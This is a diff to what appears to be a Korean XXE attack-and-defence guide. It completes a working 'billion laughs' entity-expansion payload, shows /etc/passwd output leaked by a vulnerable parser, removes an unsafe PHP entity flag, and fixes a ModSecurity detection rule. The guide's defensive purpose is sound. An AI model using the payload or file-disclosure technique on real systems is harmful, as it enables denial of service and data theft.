@@ -35,7 +35,7 @@ XML은 `<!ENTITY>` 선언을 통해 문서 내에서 재사용 가능한 콘텐�
 
 취약한 서버는 `&xxe;` 를 `/etc/passwd` 내용으로 치환해 응답한다.
 
-```
+```text
 root:x:0:0:root:/root:/bin/bash
 daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
 ...
@@ -89,6 +89,11 @@ AWS 메타데이터 서비스에 접근해 IAM 자격증명을 탈취할 수 있
   <!ENTITY lol "lol">
   <!ENTITY lol2 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">
   <!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">
+  <!ENTITY lol4 "&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;">
+  <!ENTITY lol5 "&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;">
+  <!ENTITY lol6 "&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;">
+  <!ENTITY lol7 "&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;">
+  <!ENTITY lol8 "&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;">
   <!ENTITY lol9 "&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;">
 ]>
 <root>&lol9;</root>
@@ -156,7 +161,7 @@ libxml_disable_entity_loader(true);
 
 // PHP 8.0 이후 — 기본적으로 비활성화되어 있음
 $doc = new DOMDocument();
-$doc->loadXML($xml, LIBXML_NONET | LIBXML_NOENT);
+$doc->loadXML($xml, LIBXML_NONET);
 ```
 
 ## JSON 또는 다른 포맷으로 마이그레이션
@@ -179,7 +184,7 @@ app.post('/api/import', express.json(), (req, res) => {
 SecRule REQUEST_BODY "@contains SYSTEM" \
   "id:1000001,phase:2,deny,status:403,msg:'XXE Attack'"
 
-SecRule REQUEST_BODY "@rx <!--.*DOCTYPE.*\[" \
+SecRule REQUEST_BODY "@rx <!DOCTYPE.*\[" \
   "id:1000002,phase:2,deny,status:403,msg:'XXE DOCTYPE'"
 ```
 
